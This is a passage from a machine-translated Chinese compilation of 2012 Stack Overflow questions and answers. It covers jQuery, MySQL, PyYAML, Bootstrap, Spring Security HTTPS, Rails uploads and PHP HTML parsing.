我能够与一位 Apple 工程师取得联系，他确认无法收到`window.print`来自 的请求`UIWebView`。出于我的目的，我只是使用 javascript 将`window.print`函数更改为一个命令，该命令将告诉我发出了打印请求，然后我可以打印我需要的 webview 部分。

# jquery - 简单的 JQuery 图像淡入淡出有问题

> ID：13280975
> 
> 赞同：0
> 
> 时间：2012-11-08T01:10:41.980
> 
> 标签：jquery, html

我有一个图像我想淡入淡出然后显示一个 Div。然后当单击时淡出回到上一个图像并隐藏 Div。它可以完美地显示 div，但反之则不起作用。任何帮助，将不胜感激。谢谢！

```
 <div id="calcDrop"><img id="plusCalc" height="33px" align="left" class="plusCalc changePad" alt="plusButton" src="/sites/aerialist.localhost/files/images/calculator/plusBig300.jpg" />
    <img height="34px" align="left" class="changePad" alt="Calculate Price" src="/sites/aerialist.localhost/files/images/calculator/calcDrop300.jpg" />
    </div>

    <script>

    jQuery(document).ready(function(){

        jQuery('.plusCalc').click(function(){

                    jQuery('.plusCalc').stop().animate({opacity:'0'},function(){
                    jQuery('.plusCalc').attr('src', '/sites/aerialist.localhost/files/images/calculator/minusBig300.jpg');
                    jQuery('.plusCalc').attr('class', 'minusCalc');
            }).load(function(){
                    jQuery('.minusCalc').stop().animate({opacity:'1'});
            });

            jQuery("#calculatorDiv").show('slow');

        });

          jQuery('.minusCalc').click(function(){

                jQuery('.minusCalc').stop().animate({opacity:'0'},function(){
                    jQuery('.minusCalc').attr('src', '/sites/aerialist.localhost/files/images/calculator/plusBig300.jpg');
                    jQuery('.minusCalc').attr('class', 'plusCalc');
            }).load(function(){
                    jQuery('.plusCalc').stop().animate({opacity:'1'});
            });

            jQuery("#calculatorDiv").hide('slow');

        });

    });

    </script> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-08T15:08:05.690

我可能只使用两个相互重叠的图像，然后使用jQuery的**fadeToggle**在两者之间旋转。

像这样的东西（[http://jsbin.com/ibofis/12/edit](http://jsbin.com/ibofis/12/edit)）可能会奏效。您还可以将其更改为仅淡入和淡出顶部的那个，删除每个上的第二个**fadeToggle**实例。

# math - 新闻网站排名

> ID：13280976
> 
> 赞同：1
> 
> 时间：2012-11-08T01:10:44.390
> 
> 标签：math, ranking

我正在建立一个新闻网站，用户可以在其中投票赞成或反对文章。这些文章链接到不同的实体：人、地点、公司……这些实体有一个全局分数和一个每个用户的分数。

因此，当用户在文章中投赞成票/反对票时，链接实体的全局分数和每个用户的分数会发生变化。

例如：有一篇文章提到了谷歌和微软。用户 A 喜欢这篇文章并投票。Google 和 Microsoft 实体的全球和用户 A 分数增加。

我希望用户 A 对他的个人分数的影响更大，而对全局分数的影响更小。

此外，实体必须从某个分数开始，以便第一个站点用户不能将其降低太多。

我正在考虑从 0 到 1 对实体进行排名。投票是二进制的：like(1)，not like(0)。

我正在查看[这篇博](http://masanjin.net/blog/how-to-rank-products-based-on-user-input)文中提到的[贝叶斯平均](http://en.wikipedia.org/wiki/Bayesian_average)方法，其中 C=0.7 和不同的 m 值（我使用 am 作为个人分数，另一个用于一般分数）。我进行的测试显示个人和全球分数之间几乎没有差异。似乎我找不到正确的值。

编辑：

这是我用来计算贝叶斯的代码（python）。使用这个公式，结果会更好：

```
def bayesian_average(votes, C=100, m=0.7): #C higher for global
    #votes = [1,0,1,0,0,1,1,1]
    avg_votes = C
    avg_rating = m
    ent_votes = len(votes) #entity votes
    ent_rating = sum(votes) / float(ent_votes)
    ba = ( (avg_votes * avg_rating) + (ent_votes * ent_rating) ) / (avg_votes + ent_votes)
    return ba 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-08T01:24:32.740

当我想做这样的事情时，我现在只是去[Evan Miller 的主页。](http://www.evanmiller.org/)您可能需要以下三种技术中的一种（或多种）：

*   [如何不按平均评分排序](http://www.evanmiller.org/how-not-to-sort-by-average-rating.html)

*   [乐趣和利润的线性回归](http://www.evanmiller.org/linear-regression-for-fun-and-profit.html)

*   [用牛顿冷却定律对热度进行排序](http://www.evanmiller.org/rank-hotness-with-newtons-law-of-cooling.html)

# mysql - LOAD DATA INFILE 使用 STR_TO_DATE(@var1,'%m/%d/%Y') 转换 2 个日期 - 抛出错误

> ID：13280977
> 
> 赞同：3
> 
> 时间：2012-11-08T01:10:45.823
> 
> 标签：mysql

这是抛出一个错误，我无法弄清楚为什么，有什么想法吗？

```
LOAD DATA LOCAL INFILE 'H:/Data/DB__Muni/data/msrb_AZ_short1.csv'
INTO TABLE import_mdrp FIELDS TERMINATED BY ';' LINES TERMINATED BY '\r\n' 
  ( 
    Issuer, cusip6, state, Issue,
    page_pointer, @var1, date_rng, cusip9, @var2,
    yield, Amt_Offer_Dlr, Amt_Offer_Per, Security_Description,
    Fitch, Moody, cusip_img, fitch_img, moody_img 
  )
SET maturity = STR_TO_DATE(@var2,'%m/%d/%Y') 
SET issue_date = STR_TO_DATE(@var1,'%m/%d/%Y') 
; 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-11-08T01:22:07.380

代替

```
SET maturity = STR_TO_DATE(@var2,'%m/%d/%Y') 
SET issue_date = STR_TO_DATE(@var1,'%m/%d/%Y') 
```

尝试

```
SET maturity = STR_TO_DATE(@var2,'%Y-%m-%d') 
SET issue_date = STR_TO_DATE(@var1,'%Y-%m-%d') 
```

**更新 1**

```
SET maturity = DATE_FORMAT(STR_TO_DATE(@var2, '%m/%d/%Y'), '%Y-%m-%d'),
    issue_date = DATE_FORMAT(STR_TO_DATE(@var1, '%m/%d/%Y'), '%Y-%m-%d') 
```

# python - “！”上的 pyYAML 错误 在一个字符串中

> ID：13280978
> 
> 赞同：14
> 
> 时间：2012-11-08T01:10:51.177
> 
> 标签：python, yaml, pyyaml

首先，免责声明：我对 YAML 不太熟悉。我正在尝试将 YAML 文档解析为键值对（不要担心我是怎么做的。我已经处理好了）

我的文件曾经看起来像：

```
world:
     people:
          name:Suzy
          address:chez-bob 
```

然后，有人去改了。

```
world:
     people:
          name:!$uzy
          address:chez-bob 
```

我得到这个解析错误：

```
yaml.constructor.ConstructorError: could not determine a constructor for the tag '!$uzy' 
```

这甚至意味着什么？我将如何让它仅将 !$ 解释为两个字符？我只想要一个字符串键和值的字典！此外，编辑 yaml 文件不是一种选择。必须使用解析器在代码中修复问题。

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2012-11-08T01:49:37.610

感叹号是 YAML 标签的前缀。解析器必须通过标签名称为它实现一个构造函数。有一些默认标签，如`!!bool`,`!!int`等，甚至还有一些 Python 特定标签，如`!!python/tuple`.

您可以定义自己的构造函数，甚至可以为前缀捕获的多个标签定义构造函数。通过将前缀定义为`''`，您可以捕获所有标签并忽略它们。您可以从构造函数返回标记及其值，将其全部视为文本。

```
>>> import yaml
>>> def default_ctor(loader, tag_suffix, node):
...     print loader
...     print tag_suffix
...     print node
...     return tag_suffix + ' ' + node.value
...
>>> yaml.add_multi_constructor('', default_ctor)
>>> yaml.load(y)
<yaml.loader.Loader object at 0xb76ce8ec>
!$uzy
ScalarNode(tag=u'!$uzy', value=u'')
{'world': {'people': {'name': '!$uzy', 'address': 'chez-bob'}}}
>>> 
```

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-11-08T04:24:12.663

如果值以“！”开头，则必须将值括在单引号或双引号中；否则它被解释为 YAML 标签。

```
world:
     people:
          name: "!$uzy"
          address: chez-bob 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2017-03-14T12:20:28.863

这实际上是 PyYAML 中的一个错误。它将`:`in解释为键/值分隔符，但只有在后面有空格或前面的标量 ( ) 被引用`name:!$uzy`时才应该这样做。后续错误是应该允许在标量中间的感叹号被错误地解释为在标量的开头并因此引入了标签。`:``name`

key 的值`people`是字符串，并且在其他解析器（包括我作为作者`name:!$uzy address:chez-bob`的 Python 包）中正确处理。`ruamel.yaml`

# mysql - 将触发器添加到 Magento 表中以更新数量

> ID：13280980
> 
> 赞同：2
> 
> 时间：2012-11-08T01:10:57.260
> 
> 标签：mysql, magento, triggers, eventtrigger

我正在尝试`cataloginventory_stock_item`在 magento 数据库中的表上添加一个触发器，以修改具有 sku 字符串相同部分的所有产品的字段数量。

但是结果显示我一个 sql 语法错误。

触发器是：

```
CREATE TRIGGER UpdateQuantity AFTER UPDATE OF qty ON  `cataloginventory_stock_item`
    FOR EACH ROW BEGIN
    Update cataloginventory_stock_item AS csi
    JOIN catalog_product_entity AS cpe ON cpe.entity_id = csi.product_id
    JOIN catalog_product_entity_varchar AS cpev ON cpev.entity_id = cpe.entity_id
    SET csi.qty = NEW.qty
    WHERE cpev.store_id =2 and AND cpe.sku LIKE concat( '%', (SELECT SUBSTRING_INDEX(New.sku, '_', 1 ) FROM catalog_product_entity LIMIT 1 ) , '%');
    INSERT INTO logQty VALUES(NEW.qty, old.sku,NOW());
    END 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-12T18:05:26.473

我使用您的触发器玩了一段时间并修复了一些语法问题，但似乎无法声明此触发器，因为 e`cataloginventory_stock_item`本质上没有 sku 字段，但您使用 Old 和一次使用 New 关键字引用它。

# twitter-bootstrap - Bootstrap手风琴折叠高度问题

> ID：13280982
> 
> 赞同：9
> 
> 时间：2012-11-08T01:11:11.317
> 
> 标签：twitter-bootstrap

我一直在使用折叠模块一段时间，但现在发现了一个问题，例如很长的项目。不止几段。

似乎根据您拥有的项目数量，将高度属性添加到最外层的 div，如下所示：

```
 div class="accordion in collapse" id="accordion2" style="height: 348px;" 
```

因此，当您展开一个项目时，它只会展开到上面给出的高度。如果我在开发人员模式下取消选中此选项，则一切正常。

我找不到的是它在 bootstrap.js 中添加此样式属性的位置。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-08-28T01:24:59.633

我自己工作

```
.collapse.in {
      height: auto !important;
} 
```

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2013-04-27T04:48:21.507

尝试

```
$('#accordion2').collapse('show').height('auto'); 
```

# javascript - jquery 变量的 Javascript 属性

> ID：13280983
> 
> 赞同：-2
> 
> 时间：2012-11-08T01:11:41.487
> 
> 标签：javascript

我现在正在制作一个小脚本，主函数的 arg 的输入之一是一个元素。为了确保原始 JS 适用于这些东西，我正在做这些事情`theelement.value`来获取变量的值。不幸的是，如果`thelement`是一个 jquery 函数，例如`$('#foo')`. 我需要这种兼容性的其他一些原因是我需要访问`theelement.style`jquery 不支持的东西。我知道这些（等）有 jquery 解决方法，`.css(), .val()`但如果我使用这些，那么常规的 js 输入（`document.getElementbyId('foo')`）将不起作用。有没有办法使用一个“属性”并使其对元素的所有输入都通用（包括来自原型和 Dojo 等库的东西）？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-08T01:19:34.413

不，不可能使所有东西都通用。

如果你想处理 DOM 元素，输入需要是 DOM 元素，并且框架都有办法取出 DOM 元素。你不能神奇地制作一个可以与任何库一起工作的脚本，这就是为什么通用插件通常具有库特定的扩展来添加支持。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-08T01:21:30.673

在我看来，您有一个带有参数的函数，并且在将不同类型作为该参数传递时遇到了问题：

```
function doSomething(element) {
    // do something with element
} 
```

您提到您希望元素有时是一个 jQuery 对象，有时只是一个 DOM 对象，然后您还提到了其他库（原型、Dojo）。

首先，如果您只是使用一致的类型调用您的函数，您的问题将完全消失。所有库中都可用的最简单的类型是 DOM 元素。因此，如果您只是强制将该元素作为 DOM 对象引用而不是 jQuery 对象或任何其他库对象传递，那么您的问题将完全消失。如果调用者正在使用其他库，然后想要调用您的函数，他们总是可以从该库中获取 DOM 对象并传递实际的 DOM 对象。例如，在 jQuery 中，您可以像这样获取 DOM 对象 `$("#foo").get(0)

如果你想让它更通用并接受多种类型，那么你必须编写代码来检测可能传递的每种类型，并从每种类型中获取 DOM 对象，这样你就可以对它们进行相同的处理。例如，如果你想检测 DOM 对象的 jQuery 对象，你可以这样做：

```
function doSomething(element) {
    // normalize element to be just a DOM object
    // if it's a jQuery object, then reach in to get the first DOM object
    if (element.jquery) {
        element = element.get(0);
    }

    // do something with element here which is a DOM object
} 
```

如果您也想检测其他库中的对象，那么您必须为每个其他库编写类似的检测代码，并从其他库的对象中获取实际的 DOM 对象。

# spring-mvc - Spring MVC + Spring Security：如何将应用程序从 http 迁移到 https

> ID：13280988
> 
> 赞同：3
> 
> 时间：2012-11-08T01:12:02.577
> 
> 标签：spring-mvc, https, spring-security

我已经使用 Spring Tool Suite 构建了一个 Spring MVC 应用程序。我还使用 Spring Security 来处理访问权限和登录/注销。该应用程序当前使用的是 http 协议，但我想完全迁移到 https。

我该怎么办？我是否还应该重新配置 STS 的 VFabric tc 服务器来运行应用程序？如果是这样，怎么做？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-08T06:44:13.933

如果要使用`https`协议，则需要配置应用程序容器。

关于 SSL 的 VFabric tc 服务器文档：

[http://pubs.vmware.com/vfabric5/index.jsp?topic=/com.vmware.vfabric.tc-server.2.6/admin/manual-config-ssl.html](http://pubs.vmware.com/vfabric5/index.jsp?topic=/com.vmware.vfabric.tc-server.2.6/admin/manual-config-ssl.html)

您仍然可以使用 Spring Security 功能。HTTP/HTTPS 通道安全性通过`ChannelProcessingFilter`. 幸运的是，它可以使用 Spring Security XML 命名空间轻松配置。

春季文档：

> 如果您的应用程序同时支持 HTTP 和 HTTPS，并且您要求只能通过 HTTPS 访问特定的 URL，那么使用 intercept-url 上的 requires-channel 属性直接支持这一点

示例配置：

```
<http>
    <intercept-url pattern="/secure/**" access="ROLE_USER" requires-channel="https"/>
    <intercept-url pattern="/**" access="ROLE_USER" requires-channel="any"/>
</http> 
```

更多信息：[http ://static.springsource.org/spring-security/site/docs/3.1.x/reference/springsecurity-single.html#ns-requires-channel](http://static.springsource.org/spring-security/site/docs/3.1.x/reference/springsecurity-single.html#ns-requires-channel)

# ruby-on-rails - Ruby on Rails 中的用户相册

> ID：13280989
> 
> 赞同：0
> 
> 时间：2012-11-08T01:12:06.570
> 
> 标签：ruby-on-rails, database, paperclip, photo-gallery, image-upload

我正在构建一个用户可以上传图片的应用程序。现在一次只能拍一张照片。我已经在 Web 和 Stack Overflow 上进行了搜索，但似乎并没有真正找到我正在寻找的东西，或者至少我不知道我在寻找什么，如果它存在于网站上的话。

我已经尝试实现回形针并允许用户通过它上传图片，而不是在上传新图片时删除旧图片。但是我真的不知道从哪里去显示用户上传的所有图片。我如何以最好的方式做到这一点？我应该继续使用回形针还是有更适合我需要的宝石？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-08T05:04:51.220

我更喜欢[carrierwave](https://github.com/jnicklas/carrierwave)，而不是Paperclip，因为它有更多选项并且易于设置。但是，在不知道您的照片应用程序的最终目标是什么的情况下，很难说出下一步该做什么。

如果您有路线图或功能列表，这将有助于我们帮助您进行下一步行动。

但是，如果它是一个简单的照片应用程序，不妨尝试将其构建在现有的 CMS 之上，例如[Refinery](http://refinerycms.com/)；您可以轻松地构建一个插件来使用 Refinery 上传图像。

# php - 从 Web 应用程序将文件上传到存储服务器

> ID：13280992
> 
> 赞同：1
> 
> 时间：2012-11-08T01:12:26.943
> 
> 标签：php, ftp, vps

我有一个网络应用程序，允许人们上传文件，网络应用程序和上传表单在 VPS1(24GB) 上运行我有另一个名为 VPS2(1TB) 的服务器。我希望用户使用 webapp 上传文件并将文件存储在 VPS2 上。我如何不确定执行此操作的最佳方法，我会将文件上传到 VPS1，然后通过 FTP（或其他方法）将其传输到 VPS2？或者我应该使用在 VPS2 上运行的网络服务器上的 post 方法将其直接上传到 VPS2？这必须是可扩展的，我将来会添加更多的网络服务器。

我曾想过将所有存储 VPS 服务器放在 PHP 中的一个数组中，并随机选择将文件发布到哪个数组。但我不确定，真的迷路了，想要一些高级帮助。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-30T18:23:30.583

1.您可以将文件发布到您的 vps2 php 脚本并在那里存储文件，这是一个不错的选择，并且为了可扩展性，您可以根据客户端最近的服务器位置选择要选择的服务器或随机选择一个。这是我在这里看到的最好的选择，剩下的工作就是你的数据库。

2.您也可以在磁盘已满时使用他们的本地IP使用Linux脚本将一定数量的文件备份到您的vps2服务器，以防您有本地IP与其他服务器共享。

但仍然是第一个选项更好，您可以为不同的 Web 服务器设置不同的子域，例如 vps1.domain.com/file01 和 vps2.domain.com/file02 以及类似的其他服务器，显然不同服务器上的脚本取决于会话、cookies、数据库.

# php - 使用 PHP 从 HTML 文档中查找和回显特定 ID

> ID：13280998
> 
> 赞同：3
> 
> 时间：2012-11-08T01:12:53.540
> 
> 标签：php

我正在使用 PhP 从 google 获取内容，如何在 $page 中搜索 id 为“#lga”的元素并回显另一个属性？说#lga 是一个图像，我将如何回显它的来源？

不，我不会用 Google 来做这件事，Google 只是一个示例和测试页面。

```
<body><img id="lga" src="snail.png" /></body> 
```

我想找到名为“lga”的元素并回显它的来源；所以上面的代码我想回显“snail.png”。

这就是我正在使用的以及我如何存储我发现的内容：

```
<?php
$url = "https://www.google.com/";
$page = file($url);

foreach($page as $part){
}
?> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-08T01:34:20.563

您可以使用内置[`DOMDocument`](http://php.net/manual/en/class.domdocument.php)类来实现这一点。这个类允许您以结构化的方式使用 HTML，而不是自己解析纯文本，而且它非常通用：

```
$dom = new DOMDocument();
$dom->loadHTML($html); 
```

要`src`使用 id 获取元素的属性`lga`，您可以简单地使用：

```
$imageSrc = $dom->getElementById('lga')->getAttribute('src'); 
```

请注意，`DOMDocument::loadHTML`当遇到无效的 HTML 时会生成警告。[该方法的文档页面](http://www.php.net/manual/en/domdocument.loadhtml.php)有一些关于如何抑制这些警告的注释。

此外，如果您可以控制要从中解析 HTML 的网站，那么使用专门的脚本来提供您所追求的信息可能更合适。除非您需要准确解析页面上的内容，否则像这样从 HTML 中提取数据可能会非常浪费。